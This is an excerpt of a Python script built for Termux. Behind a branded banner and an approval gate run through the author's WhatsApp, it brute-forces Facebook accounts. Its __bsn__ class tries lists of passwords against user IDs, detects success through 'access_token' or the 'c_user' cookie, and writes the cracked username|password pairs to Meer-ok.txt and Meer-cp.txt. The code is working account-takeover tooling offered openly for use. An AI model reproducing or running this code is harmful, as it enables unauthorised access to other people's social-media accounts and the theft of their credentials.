...
\__|     \__|\________|\________|\__|  \__|
 \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
 \033[1;93m▇▇➣    \033[1;91mAUTHOR   : M9X00M - MƏƏR         \033[1;93m 
 \033[1;93m▇▇➣    \033[1;94mGITHUB   : meer404        \033[1;93m                   
 \033[1;93m▇▇➣    \033[1;93mFACEBOOK : MƏƏR BR9ND        \033[1;93m     
 \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +923132234101     \033[1;93m   
 \033[1;93m▇▇➣       \033[1;91mTHIS TOOL IS FrƏƏ          \033[1;93m              
 \033[1;93m▇▇➣    \033[1;94mMGS ME  FOR APRVAL     \033[1;93m                
 \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
...
def reg():
    os.system('termux-setup-storage')
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/MaSooM.BaCha.MeeR')
    logo()
    print ('')
    ...
    try:
        ...
        reg2()
    r = requests.get('https://github.com/MeeR-xd/aprooval.txt/blob/main/aprooval.txt').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
        ...
        print ('')
        print("            \033[1;97mTHIS TOOL IS FRƏƏ F0R YOU NEED TO GET APPROVED FIRST")
        ...
        os.system('am start https://wa.me/+923132234101?text=' + tks)
        reg()
...
def reg2():
    ...
    input('\033[1;97m               PRESS ENTER  TO SEND TOKEN')
    time.sleep(3.5)
    tks = 'Dear%20MƏƏR-sir,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+id
    os.system('am start https://wa.me/+923132234101?text=' + tks)
...
def chigozie():
    ...
    try:
        ...
        os.system('xdg-open https://wa.me/+923132234101')
        bsn_menu()
...
def bsn_menu():
    ...
    IP = ipm["origin"]
    print("             [*]. CREATED BY : MƏƏR  -♥️");time.sleep (0.03)
    print("             [*]. FACEBOOK   : MƏƏR BR9ND");time.sleep (0.03)
    print("             [*]. GITHUB     : Meer404");time.sleep (0.03)   
    print("             [*]. VERSION    : 1.0");time.sleep (0.03)
    print("             [*]. TOOL TYPE  : FRƏƏ");time.sleep (0.03)
    print("             [*]. IP ADDRESS : [%s]\n"%(IP));time.sleep(0.01)
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [MƏƏR] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            ...
            if "access_token" in p:
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[CP-MƏƏR] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('Meer-cp.txt' , 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
        ...
        try:
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f'\r{H} [OK-MƏƏR] {user} | {pw}')
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('Meer-ok.txt' , 'a').write('%s\n' % wrt)
